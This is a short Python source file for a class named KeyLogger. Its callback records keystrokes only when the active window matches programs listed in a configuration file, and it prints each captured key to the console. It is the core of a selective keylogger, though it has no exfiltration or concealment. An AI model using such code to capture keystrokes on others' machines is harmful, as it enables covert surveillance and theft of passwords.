import ConfigIni

class KeyLogger:

    def getProgramsName(self):
        config = ConfigIni.GetConfiguration()
        return config.getItems('Windows')

    def interestingProgram(self, name, pattern):
        name = str(name).upper()
        name = name.replace('"', "");

        pattern = pattern.upper()
        result = pattern.find(name)

        if(result != -1):
            return True
        else:
            return False

    def echo(self, event):
        patternProgramName = self.getProgramsName()

        for key, programName in patternProgramName:
            if(self.interestingProgram(programName, event.WindowName)):
                #print('MessageName:', event.MessageName)
                #print('Message:', event.Message)
                #print('Time:', event.Time)
                #print('Window:', event.Window)
                #print('WindowName:', event.WindowName.upper())
                #print('Ascii:', event.Ascii, chr(event.Ascii))
                print('Odnotowano Key:', event.Key)
                #print('KeyID:', event.KeyID)
                #print('ScanCode:', event.ScanCode)
                #print('Extended:', event.Extended)
                #print('Injected:', event.Injected)
                #print('Alt', event.Alt)
                #print('Transition', event.Transition)
                #print('---')

        return True
